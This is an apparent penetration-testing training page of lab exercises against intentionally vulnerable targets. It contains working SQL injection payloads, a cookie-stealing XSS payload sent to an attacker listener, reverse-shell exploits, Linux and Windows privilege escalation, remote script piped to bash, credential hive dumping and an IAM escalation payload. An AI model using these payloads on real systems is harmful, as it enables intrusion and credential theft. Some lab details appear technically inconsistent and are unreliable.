@@ -1,0 +1,847 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Practical Exercises &amp; Labs</title>
+<link rel="stylesheet" href="style.css">
+<style>
+.lab{
+  background:linear-gradient(135deg,#fff9e6 0%,#fff3d9 100%);
+  border:2px solid #fbc531;padding:18px 22px;
+  margin:20px 0;border-radius:8px;
+}
+.lab h4{margin-top:0;color:#996300}
+.task{background:#fff;padding:12px;margin:10px 0;border-left:4px solid #44bd32;border-radius:4px}
+.solution{background:#f0f8ff;padding:12px;margin:10px 0;border-left:4px solid #0097e6;border-radius:4px;display:none}
+.solution-toggle{cursor:pointer;font-weight:600;color:#0097e6}
+.warning-box{background:#f8d7da;border:2px solid #e55039;padding:15px;margin:20px 0;border-radius:8px;color:#721c24}
+</style>
+</head>
+<body>
+
+<nav class="breadcrumb">
+<a href="../index.html">🏠 Home</a> &rsaquo; <strong>Practical Exercises &amp; Labs</strong>
+</nav>
+
+<header class="part-header">
+<h1>🧪 PRACTICAL EXERCISES &amp; LABS</h1>
+<p class="subtitle">Step-by-step hands-on exercises for every major VAPT skill. The "lab notebook" of
+the book.</p>
+<div class="chapters">
+<a href="#lab1"><span class="ch-num">L1</span> Lab Setup Walkthrough</a>
+<a href="#lab2"><span class="ch-num">L2</span> Reconnaissance Labs</a>
+<a href="#lab3"><span class="ch-num">L3</span> Web App Testing Labs</a>
+<a href="#lab4"><span class="ch-num">L4</span> Network Exploitation Labs</a>
+<a href="#lab5"><span class="ch-num">L5</span> Privilege Escalation Labs</a>
+<a href="#lab6"><span class="ch-num">L6</span> Cloud Security Labs</a>
+<a href="#lab7"><span class="ch-num">L7</span> Mobile Pentest Labs</a>
+<a href="#lab8"><span class="ch-num">L8</span> CTF-Style Challenges</a>
+<a href="#lab9"><span class="ch-num">L9</span> Reporting Exercises</a>
+<a href="#lab10"><span class="ch-num">L10</span> Capture-the-Flag Walkthroughs</a>
+</div>
+</header>
+
+<main>
+
+<h1>📚 Why This Section</h1>
+<div class="box success">
+<h3 style="margin-top:0">Reading isn't enough — practice is the only path to mastery.</h3>
+<p>This file contains step-by-step exercises designed to take ~50 hours total.
+Each lab has clear objectives, prerequisites, time estimate, and solutions.
+Do them in order. By Lab 10, you should be ready for OSCP.</p>
+</div>
+
+
+<!-- ============ LAB 1 ============ -->
+<h1 id="lab1">🏗️ Lab 1 — Setting Up Your Pentest Lab (90 minutes)</h1>
+
+<h2>Exercise 1.1: Install Kali Linux on VirtualBox</h2>
+
+<div class="lab">
+<h4>📋 Objective</h4>
+<p>Have a fully working Kali Linux VM that can run vulnerable targets and tools.</p>
+
+<h4>⏱ Time Estimate</h4>
+<p>60 minutes.</p>
+
+<h4>📝 Prerequisites</h4>
+<ul>
+  <li>Computer with virtualization (Intel VT-x / AMD-V) enabled</li>
+  <li>20 GB free disk space</li>
+  <li>8 GB RAM minimum</li>
+</ul>
+
+<h4>🎬 Steps</h4>
+<ol>
+  <li>Download VirtualBox from <code>virtualbox.org</code></li>
+  <li>Download Kali Linux ISO/OVA from <code>kali.org/get-kali</code></li>
+  <li>Open VirtualBox → New VM:
+    <ul>
+      <li>Name: <code>Kali-Pentest</code></li>
+      <li>Type: Linux, Debian (64-bit)</li>
+      <li>RAM: 4096 MB</li>
+      <li>Disk: 80 GB dynamically allocated</li>
+    </ul>
+  </li>
+</ol>
+
+<h4>🔬 Configure the VM</h4>
+<pre><code class="cmd"># Inside the VM, after installation:
+# Login: root / toor (default)
+
+# Update
+$ apt update &amp;&amp; apt full-upgrade -y
+
+# Install additional tools we'll use throughout
+$ apt install -y \
+  nmap metasploit-framework burpsuite wireshark jq \
+  ffuf wfuzz gobuster nuclei sqlmap hydra john hashcat \
+  bloodhound neo4j crackmapexec evil-winrm mimikatz \
+  responder frida-tools objection apktool jadx mobsf
+
+# Create non-root user (best practice)
+$ adduser pentester
+$ usermod -aG sudo pentester
+
+# Switch to pentester
+$ su pentester
+
+# Test nmap
+$ nmap -sn 192.168.1.1
+# Should scan successfully
+</code></pre>
+
+<h4>📋 Verification</h4>
+<ul class="checklist">
+  <li>Kali boots without errors</li>
+  <li>Network connectivity works (ping 8.8.8.8)</li>
+  <li>All packages installed (no errors)</li>
+  <li>nmap can scan successfully</li>
+  <li>Burp Suite launches</li>
+</ul>
+</div>
+
+<h2>Exercise 1.2: Deploy Vulnerable Targets</h2>
+
+<div class="lab">
+<h4>📋 Objective</h4>
+<p>Have DVWA + Juice Shop running for web app testing.</p>
+
+<h4>🎬 Steps</h4>
+<pre><code class="cmd"># Docker-based target deployment (fastest)
+$ curl -fsSL https://get.docker.com | sh
+$ sudo usermod -aG docker $USER
+$ newgrp docker
+
+$ mkdir -p ~/pentest-lab &amp;&amp; cd ~/pentest-lab
+
+# Create docker-compose.yml
+$ cat &gt; docker-compose.yml &lt;&lt; 'EOF'
+version: '3'
+services:
+  dvwa:
+    image: vulnerables/web-dvwa
+    ports:
+      - "8080:80"
+    environment:
+      - SECURITY_LEVEL=low
+
+  juice-shop:
+    image: bkimminich/juice-shop
+    ports:
+      - "3000:3000"
+
+  webgoat:
+    image: webgoat/webgoat
+    ports:
+      - "8081:8080"
+EOF
+
+$ docker-compose up -d
+
+# Wait 30 seconds, then verify
+$ curl -I http://localhost:8080          # DVWA
+$ curl -I http://localhost:3000          # Juice Shop
+$ curl -I http://localhost:8081/WebGoat  # WebGoat
+
+# Should see HTTP 200, 302, or similar
+</code></pre>
+
+<h4>📋 Verification</h4>
+<ul class="checklist">
+  <li>DVWA accessible at http://localhost:8080 (login: admin/password)</li>
+  <li>Juice Shop at http://localhost:3000</li>
+  <li>WebGoat at http://localhost:8081/WebGoat</li>
+  <li>You have a working lab</li>
+</ul>
+</div>
+
+
+<h2>Exercise 1.3: Configure Burp Suite + Browser</h2>
+
+<div class="lab">
+<h4>🎬 Steps</h4>
+<pre><code class="cmd"># 1) Launch Burp
+$ burpsuite &amp;
+
+# 2) Install FoxyProxy in Firefox
+#    Visit Firefox → Settings → privacy → install FoxyProxy Standard
+
+# 3) Create proxy entry
+#    Title:    Burp Local
+#    Proxy IP: 127.0.0.1
+#    Port:     8080
+#    Enable:   ☑ Use this proxy for all protocols
+
+# 4) Install Burp CA
+#    Visit http://burp in browser → click "CA Certificate"
+#    Save as burp-ca.der
+#    Firefox → Settings → Privacy → Certificates → View Certificates → Import
+#    Select burp-ca.der → ☑ Trust this CA
+
+# 5) Verify
+#    Visit https://www.google.com → http response in Burp HTTP History
+</code></pre>
+
+<h4>📋 Bonus: Burp JAR (offline)</h4>
+<pre><code class="cmd"># Latest JAR
+$ wget 'https://portswigger.net/burp/releases/download?product=community&version=2024&type=jar' -O burpsuite_community.jar
+$ java -jar burpsuite_community.jar
+</code></pre>
+</div>
+
+
+<!-- ============ LAB 2 ============ -->
+<h1 id="lab2">🔍 Lab 2 — Reconnaissance Labs</h1>
+
+<h2>Exercise 2.1: Passive Subdomain Enumeration (15 min)</h2>
+
+<div class="lab">
+<h4>📋 Objective</h4>
+<p>Find ALL subdomains of a target without directly probing.</p>
+
+<h4>🎬 Steps</h4>
+<pre><code class="cmd"># Step 1: Certificate Transparency
+$ curl -s 'https://crt.sh/?q=%25example.com&amp;output=json' | jq -r '.[].name_value' | sort -u
+
+# Step 2: Subfinder (passive DNS)
+$ apt install -y subfinder
+$ subfinder -d example.com -silent
+
+# Step 3: Amass (passive)
+$ apt install -y amass
+$ amass enum -passive -d example.com
+
+# Step 4: Combine results
+$ (curl -s 'https://crt.sh/?q=%25example.com&amp;output=json' | jq -r '.[].name_value';
+   subfinder -d example.com -silent;
+   amass enum -passive -d example.com 2&gt;/dev/null) | sort -u &gt; subs.txt
+$ wc -l subs.txt
+
+# Compare: see how various tools find different things.
+</code></pre>
+
+<h4>📋 Answer / Findings</h4>
+<p>You'll find subdomains like <code>www</code>, <code>mail</code>, <code>blog</code>, often
+<code>dev</code>, <code>staging</code>, <code>internal</code>. Each tool finds different ones
+— that's why we use multiple.</p>
+</div>
+
+<h2>Exercise 2.2: Live Host Detection (15 min)</h2>
+
+<div class="lab">
+<h4>📋 Objective</h4>
+<p>Determine which found subdomains actually serve HTTP/HTTPS.</p>
+
+<pre><code class="cmd"># Method 1: httpx
+$ cat subs.txt | httpx -status-code -silent -o live.txt
+$ cat live.txt
+
+# Method 2: dnsx + httpx
+$ cat subs.txt | dnsx -resp | httpx -status-code
+
+# Method 3: nmap HTTP probing
+$ nmap -iL subs.txt -p 80,443 -sV --open
+</code></pre>
+</div>
+
+
+<!-- ============ LAB 3 ============ -->
+<h1 id="lab3">🌐 Lab 3 — Web Application Testing Labs</h1>
+
+<h2>Exercise 3.1: Basic SQL Injection on DVWA (30 min)</h2>
+
+<div class="lab">
+<h4>📋 Objective</h4>
+<p>Find and exploit a SQL injection in DVWA's "SQL Injection" page.</p>
+
+<h4>🎬 Steps</h4>
+<ol>
+  <li>Login to DVWA: <code>http://localhost:8080/login.php</code>
+      <br>Username: <code>admin</code>, Password: <code>password</code></li>
+  <li>Set Security Level to "low": <code>http://localhost:8080/security.php</code></li>
+  <li>Go to SQL Injection page</li>
+  <li>Enter a User ID: <code>1</code> → see admin first name &amp; surname (normal)</li>
+  <li>Test with: <code>1' OR '1'='1</code> → all users shown</li>
+  <li>Determine columns: <code>1' ORDER BY 1--</code>, <code>1' ORDER BY 2--</code>,
+      <code>1' ORDER BY 3--</code> (last one fails → 2 columns)</li>
+  <li>UNION attack: <code>' UNION SELECT user(), database()--</code></li>
+  <li>List tables: <code>' UNION SELECT table_name, NULL FROM information_schema.tables--</code></li>
+  <li>List passwords: <code>' UNION SELECT user, password FROM users--</code></li>
+</ol>
+
+<h4>📋 Final Answer</h4>
+<p>You should see hashes like <code>5f4dcc3b5aa765d61d8327deb882cf99</code></p>
+
+<pre><code class="cmd"># Crack with hashcat or john
+$ hashcat -m 0 hashes.txt rockyou.txt
+# Or
+$ john --format=raw-md5 hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+# Common finds: "admin", "password", "letmein"
+</code></pre>
+</div>
+
+<h2>Exercise 3.2: Stored XSS on DVWA (20 min)</h2>
+
+<div class="lab">
+<h4>🎬 Steps</h4>
+<ol>
+  <li>DVWA security → low</li>
+  <li>Go to "XSS (Stored)" — guestbook</li>
+  <li>In Name field: <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
+  <li>Message: <code>test</code></li>
+  <li>Click "Sign Guestbook"</li>
+  <li>You'll see an alert dialog (or repeat visit shows it persistently)</li>
+</ol>
+
+<h4>📋 Variation: Cookie-stealing payload</h4>
+<p>Set up a listener, replace alert with cookie-exfil:</p>
+
+<pre><code class="cmd"># Start a listener
+$ nc -lvnp 8888
+
+# XSS payload:
+&lt;script&gt;new Image().src='http://YOUR-IP:8888/?c='+document.cookie&lt;/script&gt;
+
+# When another user visits, their cookies come back to you.
+</code></pre>
+</div>
+
+<h2>Exercise 3.3: Burp Suite Workflow — From Capture to Exploit (45 min)</h2>
+
+<div class="lab">
+<h4>🎬 Steps</h4>
+<ol>
+  <li>Start Burp + Browser Proxy 127.0.0.1:8080</li>
+  <li>Visit <code>http://localhost:3000</code> (Juice Shop)
+      <br>Click around — log in as demo user, browse products</li>
+  <li>In Burp — view HTTP History — see all your requests</li>
+  <li>Find /rest/user/login — try it in Repeater</li>
+  <li>Test: log in with wrong password → see error message</li>
+  <li>Try SQL injection: <code>' OR 1=1--</code> in email field → notice what happens</li>
+  <li>Save evidence by clicking "<span class="kbd">Screenshot</span>" in Burp</li>
+  <li>Send to Intruder for fuzzing: try usernames like admin, root, superadmin</li>
+</ol>
+</div>
+
+
+<!-- ============ LAB 4 ============ -->
+<h1 id="lab4">🛜 Lab 4 — Network Exploitation Labs</h1>
+
+<h2>Exercise 4.1: Network Discovery &amp; Service Enumeration (45 min)</h2>
+
+<div class="lab">
+<h4>🎬 Steps</h4>
+<pre><code class="cmd"># Setup Metasploitable 2 as target (download OVA from SourceForge)
+# Or use docker:
+$ docker run -d --rm -p 21:21 -p 22:22 -p 23:23 -p 25:25 \
+   -p 80:80 -p 135:135 -p 139:139 -p 445:445 -p 3306:3306 \
+   --name metasploitable vulnerables/metasploit2
+
+# Get its IP
+$ TARGET=$(docker inspect metasploitable | jq -r '.[0].NetworkSettings.IPAddress')
+echo "Target: $TARGET"
+
+# Discovery
+$ nmap -sn 192.168.1.0/24     # Find live hosts (target on this subnet)
+
+# Service scan
+$ nmap -sV -p 21,22,23,25,80,135,139,445,3306 $TARGET
+
+# Comprehensive
+$ nmap -sV -p- --script=default,vuln $TARGET
+
+# Vulnerable service tests
+$ nmap -p 21 --script=ftp-anon $TARGET
+$ nmap -p 22 --script=ssh-hostkey $TARGET
+$ nmap -p 445 --script=smb-vuln-ms17-010 $TARGET
+
+# Document findings
+</code></pre>
+
+<h4>📋 Answer</h4>
+<ul class="checklist">
+  <li>Multiple vulnerable services: vsftpd 2.3.4 backdoor, Samba 3.0.20</li>
+  <li>SMB vulnerable to MS17-010 (EternalBlue) → RCE possible</li>
+  <li>FTP anonymous login</li>
+  <li>Documentation in: <code>$HOME/pentest-evidence/Metasploit2/</code></li>
+</ul>
+</div>
+
+<h2>Exercise 4.2: Exploit EternalBlue on Metasploitable (30 min)</h2>
+
+<div class="lab">
+<h4>🎬 Steps</h4>
+<pre><code class="cmd"># Launch Metasploit
+$ msfconsole
+
+&gt; use exploit/unix/ftp/vsftpd_234_backdoor
+&gt; set RHOSTS $TARGET
+&gt; run
+# Got root shell
+
+# Now try EternalBlue (SMB)
+&gt; use exploit/windows/smb/ms17_010_eternalblue
+# Wait — Metasploitable 2 is Linux. Use SMB-related vulns instead.
+
+&gt; use exploit/unix/samba/trans2open
+&gt; set RHOSTS $TARGET
+&gt; set PAYLOAD cmd/unix/reverse_netcat
+&gt; set LHOST tun0
+&gt; run
+# Got shell as root
+</code></pre>
+</div>
+
+
+<!-- ============ LAB 5 ============ -->
+<h1 id="lab5">⬆ Lab 5 — Privilege Escalation Labs</h1>
+
+<h2>Exercise 5.1: Linux SUID Privilege Escalation (30 min)</h2>
+
+<div class="lab">
+<h4>📋 Setup: Vulnerable Linux VM</h4>
+<pre><code class="cmd"># Use Lin.Security (lab) or DVWA
+$ docker run -d --name lins -p 2222:22 vulnerables/lins
+$ ssh -p 2222 user@localhost   # password: user/user
+
+# Inside the box
+$ id
+$ find / -perm -u=s -type f 2&gt;/dev/null
+# /usr/bin/python3 ← SUID!
+# /usr/bin/find
+# /usr/bin/vim
+
+# Check our user
+$ whoami
+</code></pre>
+
+<h4>🎬 Steps: Escalate to root</h4>
+<pre><code class="cmd"># Method 1: Python SUID
+$ python3 -c 'import os; os.execvp("/bin/sh", ["sh"])'
+# We are root via SUID
+$ whoami
+# root 💪
+
+# Method 2: find with exec
+$ find / -name anything -exec /bin/sh \;
+
+# Method 3: vim with shell
+$ vim -c ':!/bin/sh'
+
+# Method 4: LinPEAS sweep
+$ curl http://your-kali/linspeas.sh | bash
+# Identify other escalation paths
+</code></pre>
+</div>
+
+<h2>Exercise 5.2: Windows Privilege Escalation via Potato (45 min)</h2>
+
+<div class="lab">
+<h4>📋 Setup</h4>
+<pre><code class="cmd"># Use Metasploitable 3 (Windows) in lab
+$ docker run -d --name winbox -p 3389:3389 vulnerables/metasploit3
+$ docker exec winbox net user pentester /add
+$ docker exec winbox net localgroup administrators pentester /add
+# Default password: password
+
+# RDP from Kali
+$ rdesktop -u pentester -p password winbox.local
+
+# Inside: open cmd.exe as STARTED USER (no admin)
+</code></pre>
+
+<h4>🎬 Privilege Escalation</h4>
+<pre><code class="cmd"># Check current privileges
+PS&gt; whoami /priv
+# Note: SeImpersonatePrivilege = Enabled (must have it!)
+
+# PrintSpoofer
+PS&gt; iwr http://kali/PrintSpoofer64.exe -OutFile ps.exe
+PS&gt; .\ps.exe -i -c cmd
+# We get nt authority\system shell
+
+# Alternate: SweetPotato
+PS&gt; iwr http://kali/SweetPotato.exe -OutFile sp.exe
+PS&gt; .\sp.exe -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
+# nt authority\system
+
+# Now you can:
+PS&gt; reg save HKLM\SAM sam.hive
+PS&gt; reg save HKLM\SYSTEM system.hive
+$ impacket-secretsdump -sam sam.hive -system system.hive LOCAL
+</code></pre>
+</div>
+
+
+<!-- ============ LAB 6 ============ -->
+<h1 id="lab6">☁️ Lab 6 — Cloud Security Hands-On (60 min)</h1>
+
+<h2>Exercise 6.1: AWS Misconfiguration Detection with ScoutSuite</h2>
+
+<div class="lab">
+<h4>📋 Setup</h4>
+<pre><code class="cmd"># AWS Free Tier account signup (using personal email not production)
+# Once you have access keys + account ID, configure:
+$ pip install scoutsuite
+$ aws configure
+# Enter test credentials
+
+# Run audit
+$ scout aws --report-dir ./scout-report
+$ open ./scout-report/aws/index.html
+
+# It will show:
+# - IAM misconfigurations
+# - S3 buckets with public access
+# - EC2 with public IPs
+# - MFA not enabled
+# - And more
+</code></pre>
+
+<h4>📋 Answer</h4>
+<p>Default AWS accounts will have several misconfigurations. Fix them and re-run.</p>
+</div>
+
+<h2>Exercise 6.2: CloudGoat — IAM Privilege Escalation</h2>
+
+<div class="lab">
+<h4>📋 Setup</h4>
+<pre><code class="cmd"># Install CloudGoat (a vulnerable AWS setup)
+$ git clone https://github.com/RhinoSecurityLabs/cloudgoat.git
+$ cd cloudgoat
+$ pip install -r requirements.txt
+$ python3 cloudgoat.py create iam_privesc_by_rollback
+
+# Configuration:
+# - Set AWS keys for your test account
+# - It deploys vulnerable IAM roles
+# - Goal: Start as low-prives user; escalate to admin
+
+# Get credentials from CloudGoat output
+$ python3 cloudgoat.py describe iam_privesc_by_rollback
+</code></pre>
+
+<h4>🎬 Solution</h4>
+<pre><code class="cmd"># Step 1: Configure with starter creds
+$ export AWS_ACCESS_KEY_ID=...
+$ export AWS_SECRET_ACCESS_KEY=...
+
+# Step 2: Discover roles
+$ aws sts get-caller-identity
+$ aws iam list-roles
+
+# Step 3: Trigger lambda with parameter that escalates
+$ aws lambda update-function-code --function-name "escape_lambda" --zip-file fileb://./evil.py
+
+# evil.py:
+def handler(event, context):
+    import boto3
+    iam = boto3.client('iam')
+    iam.attach_user_policy(UserName='target_user', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
+    return "Pwned!"
+
+$ aws lambda invoke --function-name escape_lambda /dev/stdout
+# Now you have admin on go-forward
+</code></pre>
+</div>
+
+
+<!-- ============ LAB 7 ============ -->
+<h1 id="lab7">📱 Lab 7 — Mobile Pentest Labs (45 min)</h1>
+
+<h2>Exercise 7.1: Static Analysis of an Android APK</h2>
+
+<div class="lab">
+<h4>📋 Setup</h4>
+<pre><code class="cmd"># Download a vulnerable APK
+$ wget https://github.com/payatu/diva-android/releases/download/v13/diva-beta-13.apk
+   -O diva.apk
+
+# Install MobSF (all-in-one mobile scanner)
+$ docker pull opensecurity/mobile-security-framework-mobsf
+$ docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf
+# Browse to http://localhost:8000
+
+# Or manual analysis:
+$ apktool d diva.apk -o diva-extracted
+$ cat diva-extracted/AndroidManifest.xml | grep -E "exported|debuggable|allowBackup"
+
+# Decompile to Java
+$ jadx diva.apk -d diva-source
+$ grep -rn "password\|secret\|api_key\|token" diva-source/ | head
+</code></pre>
+
+<h4>📋 Findings in DIVA</h4>
+<ul class="checklist">
+  <li>Hardcoded credentials</li>
+  <li>Exported activities (can call intents directly)</li>
+  <li>Insecure data storage (plaintext SharedPreferences)</li>
+  <li>Debug logging that leaks sensitive data</li>
+</ul>
+</div>
+
+<h2>Exercise 7.2: Hook an Android App with Frida</h2>
+
+<div class="lab">
+<h4>🎬 Steps</h4>
+<pre><code class="cmd"># 1) Start emulator with frida-server
+$ adb shell
+$ su
+$ /data/local/tmp/frida-server &amp;
+$ exit
+
+# 2) Hook a specific function in DIVA
+$ cat diva_hook.js
+Java.perform(function() {
+  var cls = Java.use('jakhar.aseem.diva.DivaJni');
+  cls.access.implementation = function() {
+    console.log('[+] access() called');
+    console.log('[+] returning true');
+    return true;
+  };
+});
+Java.perform(function() {
+  var cls = Java.use('jakhar.aseem.diva.AccessControl1Activity');
+  cls.check.implementation = function(password) {
+    console.log('[+] check() called with: ' + password);
+    return true;
+  };
+});
+
+$ frida -U -f jakhar.aseem.diva -l diva_hook.js
+# Now exercise access control 1, 2 of DIVA — bypassed!
+</code></pre>
+</div>
+
+
+<!-- ============ LAB 8 ============ -->
+<h1 id="lab8">🏁 Lab 8 — CTF-Style Challenges (60 min)</h1>
+
+<h2>Exercise 8.1: Web-Based Capture-the-Flag on HackTheBox</h2>
+
+<div class="lab">
+<h4>🎬 Steps</h4>
+<ol>
+  <li>Sign up at hackthebox.com (free account available)</li>
+  <li>Connect to HTB VPN (free for active boxes)</li>
+  <li>Pick any "Easy" rated box as your first</li>
+  <li>Document your process using <code>./root/htb/bounty.html</code> template:</li>
+</ol>
+
+<h4>📋 First-Box Workflow (Recommended)</h4>
+<pre><code class="cmd"># Recon
+$ nmap -sV -Pn box-ip
+# Find web port (80/443 most likely)
+
+# Try common endpoints
+$ curl http://box-ip/
+$ gobuster dir -u http://box-ip/ -w raft-medium.txt
+
+# If login page found:
+# Test default creds (admin/admin)
+# Test SQLi
+# Test directory traversal
+
+# Document EVERYTHING in:
+$ vim htb-notes.md
+</code></pre>
+</div>
+
+
+<h2>Exercise 8.2: TryHackMe Beginner Track</h2>
+
+<div class="lab">
+<h4>🎬 Steps</h4>
+<ol>
+  <li>Sign up at tryhackme.com</li>
+  <li>Complete the "Jr Penetration Tester" path</li>
+  <li>Specifically focus on these rooms:
+    <ul>
+      <li>OWASP Top 10</li>
+      <li>Burp Suite Module</li>
+      <li>Linux PrivEsc</li>
+      <li>Windows PrivEsc</li>
+      <li>Active Directory Basics</li>
+    </ul>
+  </li>
+</ol>
+
+<h4>📋 Why These Specific Rooms</h4>
+<ul>
+  <li>OWASP Top 10: Industry-standard knowledge</li>
+  <li>Burp Suite Mastery: 80% of your toolkit</li>
+  <li>Linux/Windows PrivEsc: Most engagements need this</li>
+  <li>AD Basics: Corporate pentester bread &amp; butter</li>
+</ul>
+</div>
+
+
+<!-- ============ LAB 9 ============ -->
+<h1 id="lab9">📝 Lab 9 — Reporting Exercises</h1>
+
+<h2>Exercise 9.1: Write a Sample Report (90 min)</h2>
+
+<div class="lab">
+<h4>📋 Objective</h4>
+<p>Practice translating your findings (from Lab 3.1 SQL injection on DVWA) into
+a professional report.</p>
+
+<h4>🎬 Steps</h4>
+<ol>
+  <li>Open Part 9 (Templates) and copy "Finding Template"</li>
+  <li>For the SQLi in DVWA, fill in:
+    <ul>
+      <li>Title: "SQL Injection in /vulnerabilities/sqli/"</li>
+      <li>CVSS: 9.8 (vector per Appendix A10)</li>
+      <li>Description: 3 paragraphs explaining</li>
+      <li>Steps: 5 numbered steps to reproduce</li>
+      <li>PoC: Screenshot placeholder</li>
+      <li>Remediation: Use parameterized queries (Java code snippet)</li>
+      <li>References: CWE-89, OWASP A03:2021</li>
+    </ul>
+  </li>
+  <li>Now do the same for the Stored XSS you found</li>
+  <li>Write a 1-page executive summary as if you had 3 criticals + 2 highs</li>
+</ol>
+
+<h4>📋 Evaluation Criteria (Self-Score)</h4>
+<ul class="checklist">
+  <li>Finding: Could the client re-run your steps and see the issue?</li>
+  <li>Severity: Is the CVSS appropriate?</li>
+  <li>Description: Would a non-tech person understand the impact?</li>
+  <li>Remediation: Could the dev team implement your fix?</li>
+  <li>Executive Summary: Does the CEO get the gist?</li>
+</ul>
+</div>
+
+
+<!-- ============ LAB 10 ============ -->
+<h1 id="lab10">🚩 Lab 10 — Capture-the-Flag Walkthrough Examples</h1>
+
+<h2>Exercise 10.1: A Realistic CTF (90 min)</h2>
+
+<p>Below is a fictional CTF that combines everything we've learned. Try to complete
+without looking at the answer section.</p>
+
+<div class="lab">
+<h4>🎯 Mission: "Expose It"</h4>
+<p>You've been given a target: <code>ctf.example.com</code> (fictional).<br>
+Your goal: capture the flag (CTF{...}) hidden somewhere in the system.</p>
+
+<h4>📋 Hints Available (use as needed)</h4>
+<ul>
+  <li><strong>Hint 1</strong>: The flag is in the database.</li>
+  <li><strong>Hint 2</strong>: The endpoint for the search page is at /search.</li>
+  <li><strong>Hint 3</strong>: There's a way to access admin functionality without admin creds.</li>
+  <li><strong>Hint 4</strong>: UNION SELECT works.</li>
+</ul>
+</div>
+
+<h4>📋 Suggested Walk-Through</h4>
+<pre><code class="cmd"># Step 1: Recon
+$ nmap -sV ctf.example.com
+# Found: nginx 1.24, PHP 7.4, MySQL
+
+$ whatweb ctf.example.com
+# Found: jQuery 1.6.2, Bootstrap 4
+
+# Step 2: Test login / registration
+$ curl -c cookies.txt -d 'username=test&amp;password=test' http://ctf.example.com/login
+# Got session cookie
+
+# Step 3: Test search page for SQL injection
+$ curl -b cookies.txt 'http://ctf.example.com/search?q=phone'
+# Returns products
+
+# Try malicious:
+$ curl -b cookies.txt 'http://ctf.example.com/search?q=phone%27'
+# → Error: SQL syntax
+# SQLi confirmed!
+
+# Step 4: UNION attack to dump database
+$ curl -b cookies.txt "http://ctf.example.com/search?q=' UNION SELECT table_name, NULL FROM information_schema.tables--"
+# → Contains tables including 'flags'
+
+# Step 5: Dump flags table
+$ curl -b cookies.txt "http://ctf.example.com/search?q=' UNION SELECT flag_value, NULL FROM flags--"
+# → Got CTF{...}!
+
+# Answer: CTF{you_hacked_it}
+</code></pre>
+
+<h4>📍 Bonus Variations to Try</h4>
+<ul>
+  <li>Use sqlmap instead of manual UNION</li>
+  <li>Try Boolean-based blind SQLi</li>
+  <li>Use time-based if no output</li>
+  <li>Combine with finding admin via misconfiguration</li>
+</ul>
+</div>
+
+
+<!-- =========== WRAP-UP ============ -->
+<h1>🎓 Wrap Up</h1>
+
+<div class="box success">
+<h3 style="margin-top:0">After Completing All 10 Labs</h3>
+<p>You should now have:</p>
+<ul class="checklist">
+  <li>A working lab environment</li>
+  <li>Hands-on experience with major tools</li>
+  <li>Sample reports you wrote yourself</li>
+  <li>Confidence to take on real engagements</li>
+  <li>A portfolio of work to show employers</li>
+  <li>An understanding of your weak areas to improve</li>
+</ul>
+
+<h3>Next Steps</h3>
+<ol>
+  <li>Sign up for HTB/THM, complete 50+ boxes</li>
+  <li>Find your first bug bounty</li>
+  <li>Start a security blog</li>
+  <li>Apply for internships or junior roles</li>
+  <li>Once employed, do this book again with real engagement context</li>
+</ol>
+</div>
+
+<div class="warning-box">
+<strong>⚠ Important:</strong>
+<ul>
+  <li>Hack only systems you OWN or have explicit authorization</li>
+  <li>Never test on production without a written RoE</li>
+  <li>Document EVERYTHING during engagements</li>
+  <li>Get proper certifications before claiming expertise</li>
+  <li>Stay ethical — your career depends on reputation</li>
+</ul>
+</div>
+
+</main>
+
+<nav class="next-prev">
+<a href="chapters/part11-career.html" class="prev">⬅ Part 11 — Career Path</a>
+<a href="../index.html" class="next">🏠 Home</a>
+</nav>
+
+</body>
+</html>
